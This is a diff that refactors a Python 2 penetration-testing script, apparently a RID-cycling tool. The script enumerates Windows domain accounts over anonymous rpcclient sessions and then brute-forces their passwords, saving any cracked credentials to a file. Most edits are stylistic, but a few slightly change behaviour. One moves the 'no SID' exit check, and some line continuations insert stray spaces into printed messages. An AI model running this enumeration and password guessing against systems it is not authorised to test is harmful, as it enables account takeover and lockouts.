@@ -21,7 +21,7 @@ import sys
 # attempt to use lsa query first
 def check_user_lsa(ip):
     # pull the domain via lsaenum
-    proc = subprocess.Popen('rpcclient -U "" %s -N -c "lsaquery"' % (ip), stdout=subprocess.PIPE,
+    proc = subprocess.Popen('rpcclient -U "" %s -N -c "lsaquery"' % ip, stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, shell=True)
     stdout_value = proc.communicate()[0]
     # if the user wasn't found, return a False
@@ -106,7 +106,7 @@ try:
         # call the check_user_lsa function and check to see if we can find base SID guid
         sid = check_user_lsa(ip)
         # if lsa enumeration was successful then don't do
-        if sid != False:
+        if sid:
             if sid != "":
                 print "[*] Successfully enumerated base domain SID.. Moving on to extract via RID"
                 # format it properly
@@ -115,15 +115,15 @@ try:
                 sid = sid[4]
 
         # if we weren't successful on lsaquery
-        if sid == False:
+        else:
             print "[!] Unable to enumerate through lsaquery, trying default account names.."
             accounts = ("administrator", "guest", "krbtgt")
             for account in accounts:
                 # check the user account based on tuple
                 sid = check_user(ip, account)
                 # if its false then cycle threw
-                if sid == False:
-                    print "[!] Failed using account name: %s...Attempting another." % (account)
+                if not sid:
+                    print "[!] Failed using account name: %s...Attempting another." % account
                 else:
                     if sid != "":
                         # success! Break out of the loop
@@ -139,11 +139,10 @@ try:
             sid = sid[1]
             # remove the RID number
             sid = sid[:-4]
-
-        # we has no sids :( exiting
-        if sid == False:
-            print "[!] Unable to enumerate user accounts, sorry..Must not be vulnerable."
-            sys.exit()
+            # we has no sids :( exiting
+            if not sid:
+                print "[!] Unable to enumerate user accounts, sorry..Must not be vulnerable."
+                sys.exit()
 
         print "[*] Enumerating user accounts.. This could take a little while."
         # assign rid start and stop as integers
@@ -151,22 +150,22 @@ try:
         rid_stop = int(rid_stop)
 
         # this is where we write out our output
-        if os.path.isfile("%s_users.txt" % (ip)):
+        if os.path.isfile("%s_users.txt" % ip):
             # remove old file
-            os.remove("%s_users.txt" % (ip))
-        filewrite = file("%s_users.txt" % (ip), "a")
+            os.remove("%s_users.txt" % ip)
+        filewrite = file("%s_users.txt" % ip, "a")
 
         # cycle through rid and enumerate the domain
         while rid_start != rid_stop:
             sidname = sid_to_name(ip, sid, rid_start)
-            if sidname != None:
+            if sidname is not None:
                 # print the sid
                 print "Account name: " + sidname
                 # write the file out
                 filewrite.write(sidname + "\n")
 
             # increase rid until we hit our rid_stop
-            rid_start = rid_start + 1
+            rid_start += 1
 
         # close the file
         filewrite.close()
@@ -178,6 +177,7 @@ try:
         # our password file
         passfile = file(passwords, "r").readlines()
 
+        userfile = ""
         # if userlist was specified
         if userlist != "":
             # use the userlist specified
@@ -185,10 +185,10 @@ try:
 
         # our list of users
         if userlist == "":
-            userfile = file("%s_users.txt" % (ip), "r").readlines()
+            userfile = file("%s_users.txt" % ip, "r").readlines()
 
         # write out the files upon success
-        filewrite = file("%s_success_results.txt" % (ip), "a")
+        filewrite = file("%s_success_results.txt" % ip, "a")
 
         # cycle through username first
         for user in userfile:
@@ -208,7 +208,8 @@ try:
                         password = user.split("\\")[1]
                         password = password.upper()
                     child = pexpect.spawn("rpcclient -U '%s%%%s' %s" % (user_fixed, password, ip))
-                    i = child.expect(['LOGON_FAILURE', 'rpcclient', 'NT_STATUS_ACCOUNT_EXPIRED', 'NT_STATUS_ACCOUNT_LOCKED_OUT'])
+                    i = child.expect(['LOGON_FAILURE', 'rpcclient', 'NT_STATUS_ACCOUNT_EXPIRED',
+                                      'NT_STATUS_ACCOUNT_LOCKED_OUT'])
 
                     # login failed for this one
                     if i == 0:
@@ -225,15 +226,17 @@ try:
 
                     # if account expired
                     if i == 2:
-                        print "[-] Successfully guessed username: %s with password of: %s however, it is set to expired." % (user, password)
-                        filewrite.write("username: %s password: %s\n" % (user,password))
+                        print "[-] Successfully guessed username: %s with password of: %s \
+                              however, it is set to expired." % (user, password)
+                        filewrite.write("username: %s password: %s\n" % (user, password))
                         filewrite.close()
                         success = "1"
                         child.kill(0)
 
                     # if account is locked out
                     if i == 3:
-                        print "[!] Careful. Received a NT_STATUS_ACCOUNT_LOCKED_OUT was detected.. You may be locking accounts out!"
+                        print "[!] Careful. Received a NT_STATUS_ACCOUNT_LOCKED_OUT was detected.. \
+                               You may be locking accounts out!"
                         child.kill(0)
 
         # if we weren't successful
@@ -242,8 +245,8 @@ try:
 
         # if we got lucky
         if success != "":
-            print "[*] We got some accounts, exported results to %s_success_results_txt" % (ip)
-            print "[*] All accounts extracted via RID cycling have been exported to %s_users.txt" % (ip)
+            print "[*] We got some accounts, exported results to %s_success_results_txt" % ip
+            print "[*] All accounts extracted via RID cycling have been exported to %s_users.txt" % ip
 
     # exit out after we are finished
     sys.exit()
